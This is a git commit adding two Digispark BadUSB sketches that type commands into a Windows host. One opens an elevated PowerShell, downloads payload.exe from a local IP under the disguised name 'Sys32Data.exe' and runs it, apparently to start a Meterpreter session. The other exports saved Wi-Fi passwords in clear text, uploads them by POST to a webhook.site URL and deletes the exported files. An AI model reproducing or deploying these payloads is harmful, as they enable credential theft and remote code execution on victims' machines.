cf2705de8ac0c8647cfc14f2914eeeb12fc5fdf4
antnux <103955741+antnux@users.noreply.github.com>
2022-08-23 01:33:52 +0200

    Add files via upload

---
+++ Payloads/MeterpreterSession/MeterpreterSession.ino
@@ -0,0 +1,27 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+}
+
+void loop() {
+ int d=1000;
+   DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1200);
+  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+ DigiKeyboard.delay(5000);
+ DigiKeyboard.print("$client = new-object System.Net.WebClient");
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ DigiKeyboard.delay(d);
+ DigiKeyboard.print("$client.DownloadFile('http://192.168.1.198/payload.exe','Sys32Data.exe')");
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ DigiKeyboard.print("start Sys32Data.exe");
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ DigiKeyboard.delay(1000);
+ DigiKeyboard.sendKeyStroke(KEY_F4|MOD_ALT_LEFT);
+ DigiKeyboard.delay(50000);
+}
---
+++ Payloads/WifiStealer/WifiStealer.ino
@@ -0,0 +1,76 @@
+// [ ===== Created using duckify.huhn.me @ dev aadd7808 ===== ] //
+// Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
+// Please consider supporting us on ko-fi.com/spacehuhn <3
+// Learn more about us at spacehuhn.com
+
+// Platform: Digispark
+// Keyboard Layout: IT
+
+#include "DigiKeyboard.h"
+
+// cmd
+const uint8_t key_arr_0[] PROGMEM = {0,6, 0,16, 0,7};
+// cd %temp%
+const uint8_t key_arr_1[] PROGMEM = {0,6, 0,7, 0,44, 2,34, 0,23, 0,8, 0,16, 0,19, 2,34};
+// netsh wlan export profile key=clear
+const uint8_t key_arr_2[] PROGMEM = {0,17, 0,8, 0,23, 0,22, 0,11, 0,44, 0,26, 0,15, 0,4, 0,17, 0,44, 0,8, 0,27, 0,19, 0,18, 0,21, 0,23, 0,44, 0,19, 0,21, 0,18, 0,9, 0,12, 0,15, 0,8, 0,44, 0,14, 0,8, 0,28, 2,39, 0,6, 0,15, 0,8, 0,4, 0,21};
+// powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
+const uint8_t key_arr_3[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,56, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 0,44, 0,56, 2,19, 0,4, 0,23, 0,11, 0,44, 2,26, 0,12, 0,56, 2,9, 0,12, 2,48, 0,55, 0,27, 0,16, 0,15, 0,44, 0,56, 2,19, 0,4, 0,23, 0,23, 0,8, 0,21, 0,17, 0,44, 0,45, 0,14, 0,8, 0,28, 2,16, 0,4, 0,23, 0,8, 0,21, 0,12, 0,4, 0,15, 0,45, 0,44, 2,100, 0,44, 2,26, 0,12, 2,9, 0,12, 0,56, 2,14, 0,8, 0,28};
+// powershell Invoke-WebRequest -Uri https://webhook.site/34bde40d-138a-4ec7-9b26-b8c5e81d47b4 -Method POST -InFile WiFi-Key
+const uint8_t key_arr_4[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,56, 2,26, 0,8, 0,5, 2,21, 0,8, 0,20, 0,24, 0,8, 0,22, 0,23, 0,44, 0,56, 2,24, 0,21, 0,12, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,55, 2,36, 2,36, 0,26, 0,8, 0,5, 0,11, 0,18, 0,18, 0,14, 0,55, 0,22, 0,12, 0,23, 0,8, 2,36, 0,32, 0,33, 0,5, 0,7, 0,8, 0,33, 0,39, 0,7, 0,56, 0,30, 0,32, 0,37, 0,4, 0,56, 0,33, 0,8, 0,6, 0,36, 0,56, 0,38, 0,5, 0,31, 0,35, 0,56, 0,5, 0,37, 0,6, 0,34, 0,8, 0,37, 0,30, 0,7, 0,33, 0,36, 0,5, 0,33, 0,44, 0,56, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 2,19, 2,18, 2,22, 2,23, 0,44, 0,56, 2,12, 0,17, 2,9, 0,12, 0,15, 0,8, 0,44, 2,26, 0,12, 2,9, 0,12, 0,56, 2,14, 0,8, 0,28};
+// del Wi* /s/f/q
+const uint8_t key_arr_5[] PROGMEM = {0,7, 0,8, 0,15, 0,44, 2,26, 0,12, 2,48, 0,44, 2,36, 0,22, 2,36, 0,9, 2,36, 0,20};
+// exit
+const uint8_t key_arr_6[] PROGMEM = {0,8, 0,27, 0,12, 0,23};
+
+void duckyString(const uint8_t* keys, size_t len) {  
+    for(size_t i=0; i<len; i+=2) {
+        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
+    }
+}
+
+void setup() {
+    pinMode(1, OUTPUT); // Enable LED
+    digitalWrite(1, LOW); // Turn LED off
+    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed
+
+    DigiKeyboard.delay(800); // DELAY 800
+    DigiKeyboard.sendKeyStroke(41, 1); // CONTROL ESCAPE
+    DigiKeyboard.delay(400); // DELAY 400
+    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING cmd
+    DigiKeyboard.delay(1200); // DELAY 1200
+    DigiKeyboard.sendKeyStroke(79, 0); // RIGHT
+    DigiKeyboard.delay(400); // DELAY 400
+    DigiKeyboard.sendKeyStroke(81, 0); // DOWN
+    DigiKeyboard.delay(200); // DELAY 200
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(1800); // DELAY 1500
+    DigiKeyboard.sendKeyStroke(80, 0); // LEFT
+    DigiKeyboard.delay(1000); // DELAY 1000
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(1000); // DELAY 1000
+    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING cd %temp%
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(500); // DELAY 500
+    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING netsh wlan export profile key=clear
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(500); // DELAY 500
+    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING powershell Select-String -Path Wi-Fi*.x...
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(1000); // DELAY 1000
+    DigiKeyboard.delay(500); // DELAY 500
+    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING powershell Invoke-WebRequest -Uri https://webhook.site/34bde40d-138a-4ec7-9b26-b8c5e81d47b4
+    DigiKeyboard.delay(400); // DELAY 400
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(300); // DELAY 300
+    duckyString(key_arr_5, sizeof(key_arr_5)); // STRING del Wi* /s/f/q
+    DigiKeyboard.delay(200); // DELAY 200
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(500); // DELAY 500
+    duckyString(key_arr_6, sizeof(key_arr_6)); // STRING exit
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+}
+
+void loop() {}
+
+// Created using duckify.huhn.me @ dev aadd7808
